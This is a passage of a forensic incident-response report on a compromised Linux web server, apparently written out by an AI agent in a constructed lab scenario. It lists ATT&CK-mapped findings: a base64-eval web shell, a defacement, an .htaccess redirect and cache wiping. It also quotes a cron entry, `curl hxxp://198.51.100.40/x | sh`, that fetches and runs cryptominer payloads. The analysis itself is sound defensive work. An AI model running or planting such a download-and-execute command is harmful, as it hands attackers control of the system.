act/inc.php:4` `` |\n| Impact | T1491.001 | Internal Defacement | `/var/www/html/index.html` | Alerted (ALERT-02) | `` `/disk/var/www/html/index.html:3` `` |\n| Execution / Persistence | T1053.003 | Cron Scheduled Task | `/var/spool/cron/crontabs/www-data` | **SILENT / Unalerted** | `` `/disk/var/spool/cron/crontabs/www-data:5` `` |\n| Persistence | T1505.003 | Web Shell / Redirect | `/var/www/html/.htaccess` | **SILENT / Unalerted** | `` `/disk/var/www/html/.htaccess:2` `` |\n| Defense Evasion | T1070.004 | File Deletion / Cache Wiping | `/var/lib/.cache/.wiped.bin` | **SILENT / Unalerted** | `` `/disk/var/lib/.cache/.wiped.bin:1` `` |\n\n## 4. Technical Analysis of Artifacts & Persistence\n\n### Web Shell (`T1505.003`)\nLocated at `/var/www/html/wp-content/plugins/contact/inc.php` `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` ``. The plugin file contains a backdoor executing `eval()` on base64-decoded HTTP request payloads submitted by the attacker.\n\n### Defacement (`T1491.001`)\nLocated at `/var/www/html/index.html` `` `/disk/var/www/html/index.html:3` ``. The legitimate web index was replaced with defacement content containing indicator `hacked=CHK-02`.\n\n### Silent Cron Persistence (`T1053.003`)\nLocated at `/var/spool/cron/crontabs/www-data` line 5 `` `/disk/var/spool/cron/crontabs/www-data:5` ``. This job periodically attempts to execute `curl hxxp://198.51.100.40/x | sh` as root/www-data to re-download cryptominer payloads (`xmrig`, `pgdaemon`, `redis`, `wget`). This entry was missed by the initial security alerts feed.\n\n### Silent `.htaccess` Redirect (`T1505.003`)\nLocated at `/var/www/html/.htaccess` line 2 `` `/disk/var/www/html/.htaccess:2` ``. A malicious `RewriteRule` redirects incoming web traffic to `198.51.100.40` (pharma redirection campaign). This entry was missed by the initial security alerts feed.\n\n### Silent Anti-Forensics Cache Wiping (`T1070.004`)\nLocated at `/var/lib/.cache/.wiped.bin` line 1 `` `/disk/var/lib/.cache/.wiped.bin:1` ``. The attacker executed wiping utilities to destroy binary samples and cache files, leaving partial recovery signatures referencing C2 beaconing to `198.51.100.40` and domain `update-wordpress.example.cn`.\nEOF\n"] min_timeout_sec: 0.5 max_timeout_sec: 180.0
